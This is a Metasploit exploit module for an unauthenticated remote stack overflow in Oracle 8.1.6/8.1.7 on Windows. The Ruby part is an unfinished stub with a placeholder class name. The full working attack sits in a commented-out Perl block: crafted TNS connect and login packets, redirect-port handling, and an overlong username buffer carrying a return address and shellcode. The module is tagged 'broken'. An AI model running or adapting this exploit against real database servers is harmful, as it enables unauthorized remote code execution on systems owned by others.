require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Oracle Unauthenticated Remote Overflow',
			'Description'    => %q{
				There is a remotely exploitable buffer overflow
				vulnerability in the authentication process with the Oracle
				Database Server.  By supplying an overly long username when
				attempting to log onto the database server an attacker can
				overflow a stack based buffer overwriting the saved return
				address. Any arbitrary code supplied by an attacker would
				execute with the same privileges as the user running the
				service, this exploit working on Oracle 8.1.6/8.1.7 for
				windows;
					
			},
			'Author'         => [ 'Sam <Sam@0x557.org>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '6319'],
					[ 'URL', 'http://www.nextgenss.com/advisories/ora-unauthrm.txt'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 420,
					'BadChars' => "\x00\x0a\x0d",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::oracle8i_unauth_remote;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
{
	'Name' => 'Oracle Unauthenticated Remote Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'Sam <Sam [at] 0x557.org>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 1,
	'UserOpts'  => 
	{
	            'RHOST' => [1, 'ADDR', 'The target address'],
	            'RPORT' => [1, 'PORT', 'The target port', 1521],
	            'SID'   => [1, 'SID' , 'The service ID'],
	},
	
	'Payload'  => 
	{
	         'Space'  => 420,
	         'BadChars'  => "\x00\x0a\x0d",
	},
	'Description'  => Pex::Text::Freeform(qq{
		There is a remotely exploitable buffer overflow vulnerability in the
		authentication process with the Oracle Database Server.  By supplying an
		overly long username when attempting to log onto the database server an
		attacker can overflow a stack based buffer overwriting the saved return
		address. Any arbitrary code supplied by an attacker would execute with the
		same privileges as the user running the service, this exploit working on
		Oracle 8.1.6/8.1.7 for windows;
	}),         
	'Refs'  =>  
	[  
	    ['OSVDB', 6319],
	    ['URL', 'http://www.nextgenss.com/advisories/ora-unauthrm.txt'],
	],
	'DefaultTarget' => 0,
	'Targets' => 
	[
		['OracleDB Version 8.1.6.0.0 for Windows 2000',   676, 0x60a01936],
		['OracleDB Version 8.1.7.0.0 for Windows 2000',   680, 0x60a01936],
	],
    Keys => ['broken'],
};

sub new
{
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	
	my $target = $self->Targets->[$target_idx];
	
	my $sid = $self->GetVar ('SID');
	
	$self->PrintLine(sprintf("[*] Trying target %s with seh offset %d [0x%.8x]", @{ $target }));
	
	my $str = "(DESCRIPTION=(ADDRESS=(PROTOCOL=".
              "TCP)(HOST=". $target_host .")(PORT=1521))(CONNECT_DATA=(SID=" . $sid . ")".
              "(CID=(PROGRAM=C:\\oracle\\ora81\\bin\\loadpsp.exe)".
              "(HOST=VENUS-SST)(USER=SST))))";
              
	my $len = pack ("n", (length($str) + 58));
	
	my $strlen = pack ("n", length($str));

	my $oracle_conn_str = 
	$len . "\x00\x00\x01\x00\x00\x00\x01\x36\x01\x2c\x00\x00\x08\x00".
	"\x7f\xff\xa3\x0a\x00\x00\x01\x00" . $strlen . "\x00\x3a\x00\x00\x02\x00".
	"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x38\x00\x00".
	"\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00";
	
	 
	my $tns_dsf_pkt =
	"\x00\x8f\x00\x00\x06\x00\x00\x00\x00\x00\xde\xad\xbe\xef\x00\x85".
	"\x08\x10\x60\x00\x00\x04\x00\x00\x04\x00\x03\x00\x00\x00\x00\x00".
	"\x04\x00\x05\x08\x10\x60\x00\x00\x08\x00\x01\x00\x00\x07\x38\x28".
	"\x99\x51\x2d\x00\x12\x00\x01\xde\xad\xbe\xef\x00\x03\x00\x00\x00".
	"\x04\x00\x04\x00\x01\x00\x01\x00\x02\x00\x01\x00\x03\x00\x00\x00".
	"\x00\x00\x04\x00\x05\x08\x10\x70\x00\x00\x02\x00\x03\xe0\xe1\x00".
	"\x02\x00\x06\xfc\xff\x00\x02\x00\x02\x00\x00\x00\x00\x00\x04\x00".
	"\x05\x08\x10\x70\x00\x00\x01\x00\x01\x00\x00\x03\x00\x02\x00\x00".
	"\x00\x00\x00\x04\x00\x05\x08\x10\x70\x00\x00\x01\x00\x01\x00";
	
	my $sql_ssp_pkt =
	"\x00\x25\x00\x00\x06\x00\x00\x00\x00\x00\x01\x06\x05\x04\x03\x02".
	"\x01\x00\x49\x42\x4d\x50\x43\x2f\x57\x49\x4e\x5f\x4e\x54\x2d\x38".
	"\x2e\x31\x2e\x30\x00";

	my $sql_ssdt_pkt =
	"\x00\x21\x00\x00\x06\x00\x00\x00\x00\x00\x02\x54\x03\x54\x03\x01".
	"\x02\x06\x01\x02\x02\x01\x80\x00\x00\x00\x3c\x3c\x3c\x80\x00\x00".
	"\x00";

    my $request = $oracle_conn_str . $str;

    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
    );

    if ($s->IsError) 
    {
	    $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
	    return;
    }

    $self->PrintLine('[*] Send first data ' . length($request) . "+" . length($str) . ' bytes');
    $s->Send ($request);

    my $res = $s->Recv (-1, 5);

    	   	
    if (! $res)
    {
        $self->PrintLine("[*] No response to request");
        return;
    }
    my $fuck;
    if ($res =~ m/PORT\=([0-9]+)/)
    {
        $fuck = $1;
        $self->PrintLine("[*] Get redirect port: $fuck");
    } else
    {
        $self->PrintLine("[*] Can't get redirect port, aborting .");
        return;
    }

    $s->Close();

    $self->PrintLine('[*] Connect to redirect port .');
    my $sock = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $fuck, 
        'LocalPort' => $self->GetVar('CPORT'),
    );

    if ($sock->IsError) 
    {
        $self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
        return;
    }
	

    $sock->Send ($request);
    $sock->Send ($tns_dsf_pkt);
    $sock->Send ($sql_ssp_pkt);
    $sock->Send ($sql_ssdt_pkt);

    my $host_str = "HACKERWORKGROUP\\HACKERAdministrator1152:2280loadpsp.exe";

    my $jmpnext = "\x90\x90\xeb\x06";
    my $expbuf = "A" x ($target->[1] - 4) . $jmpnext .	# jmp +6
                 pack ('V', $target->[2]) .    
                 $shellcode;
				 
 	print "Enter...\n";
	<STDIN>;          
    $self->PrintLine('[*] Send exploit data ' . length($expbuf) . ' bytes');

    my $plen = pack ("n", (length ($host_str) + length ($expbuf) + 117));

    my $tns_login_pkt =
    $plen . "\x00\x00\x06\x00\x00\x00\x00\x00\x03\x52\x02\xcc\x43\x37".
    "\x00\x48\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x58\x17".
    "\x01\x06\x00\x00\x00\x3d\x5a\x17\x01\x10\x00\x00\x00\xfd\x59\x17".
    "\x01\x0d\x00\x00\x00\xa0\x0f\x00\x00\xbd\x5a\x17\x01\x09\x00\x00".
    "\x00\xcd\x5a\x17\x01\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x55\x17\x01\x11\x00\x00".
    "\x00\x44\x55\x17\x01";


    my $dummy = $tns_login_pkt . $expbuf . $host_str;

    $sock->Send ($dummy);
    $self->Handler ($sock);
    return;
}
   
        

=end


end
end	
